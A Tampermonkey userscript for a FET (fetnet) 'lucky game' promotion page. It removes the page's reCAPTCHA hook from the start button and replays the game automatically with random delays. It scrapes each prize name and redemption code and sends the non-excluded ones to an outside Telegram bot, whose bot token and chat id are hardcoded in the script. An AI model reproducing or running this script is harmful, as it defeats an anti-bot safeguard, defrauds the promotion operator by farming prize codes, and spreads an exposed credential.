// ==UserScript==
// @name         Line mobile
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  try to take over the world!
// @author       You
// @match        https://event.fetnet.net/luckygame/activity/game/wlxnrxX1
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/406928/Line%20mobile.user.js
// @updateURL https://update.greasyfork.org/scripts/406928/Line%20mobile.meta.js
// ==/UserScript==
function delay(timeout) {
    try{
      return new Promise((resolve) => {
        setTimeout(resolve, timeout);
      });
    }catch(err){

    }
}
function send(prizeName, prizeCode){
	fetch('https://api.telegram.org/bot369389395:AAFncSfK-_9f6Aip6fbGpft7lYQN2y7BOIE/sendMessage?chat_id=-1001410187623&text='+prizeName+"%0A"+prizeCode)
	  .then(function(response) {
	    return response.json();
	  })
	  .then(function(myJson) {
	    console.log(myJson);
	  });
}
function start(){

	document.querySelector("#startGame").classList.remove('g-recaptcha');
	document.querySelector("#startGame").removeAttribute('data-callback')
	document.querySelector("#startGame").click()

	// gift = document.querySelector("#prizePop > div > div > div > div.prize-name.red-word > p").innerText

	var waitForpop = function(selector, callback) {
	  if (jQuery(selector).length) {
	    callback();
	  } else {
	    setTimeout(function() {
	      waitForpop(selector, callback);
	    }, 1000);
		if(document.querySelector("body > div:nth-child(9)")&&document.querySelector("body > div:nth-child(9)").style.visibility == 'visible'){
		//	delay(5000)
		//	window.location.reload();
                  console.log('google')
		}
	  }
	};

	waitForpop(".open-pop", function() {
	  ifPop()
	});
}
function ifPop(){
	prizeName = document.querySelector("#prizeName").innerText
	prizeCode = document.querySelector("#prizeCode").innerText
	if(!(prizeCode=='20803' || prizeCode=='LM200' || prizeCode=='UWMENHYG' || prizeCode=='20778'))
		send(prizeName, prizeCode)

	$("#prizePop").removeClass('open-pop');
	ran = Math.floor(Math.random() * 10000+1500)
	delay(ran)
	start()
}
(function() {
    'use strict';

start()
    // Your code here...
})();